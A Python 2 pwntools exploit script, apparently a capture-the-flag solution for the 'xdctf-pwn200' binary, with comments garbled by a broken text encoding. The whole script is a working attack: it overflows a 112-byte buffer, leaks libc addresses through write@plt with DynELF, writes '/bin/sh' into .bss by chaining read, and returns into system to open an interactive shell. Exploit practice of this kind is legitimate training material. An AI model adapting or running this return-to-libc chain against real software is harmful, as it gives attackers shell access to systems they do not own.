#coding=utf-8

from pwn import *
import binascii
p = process("./xdctf-pwn200")
elf = ELF("./xdctf-pwn200")
writeplt = elf.symbols['write']
writegot = elf.got['write']
readplt = elf.symbols['read']
readgot = elf.got['read']
vulnaddress =  0x08048484 
startaddress = 0x080483d0      #����start���������Իָ�ջ
bssaddress =   0x0804a020    #����д�롰/bin/sh���ַ���
def leak(address):
  payload = "A" * 112
  payload += p32(writeplt)
  payload += p32(vulnaddress)
  payload += p32(1)
  payload += p32(address)
  payload += p32(4)
  p.send(payload)
  data = p.recv(4)
  print "%#x => %s" % (address, (data or '').encode('hex'))
  return data
print p.recvline()
dynelf = DynELF(leak, elf=ELF("./xdctf-pwn200"))
systemAddress = dynelf.lookup("__libc_system", "libc") 
print "systemAddress:", hex(systemAddress)
#����_start�������ָ�ջ
payload1 = "A" * 112
payload1 += p32(startaddress) 
p.send(payload1)
print p.recv()
ppprAddress = 0x0804856c  #��ȡ��������3��pop������gadget�ĵ�ַ 
payload1 = "A" * 112
payload1 += p32(readplt)
payload1 += p32(ppprAddress)
payload1 += p32(0)
payload1 += p32(bssaddress)
payload1 += p32(8)
payload1 += p32(systemAddress) + p32(vulnaddress) + p32(bssaddress)
p.send(payload1)
p.send('/bin/sh')
p.interactive()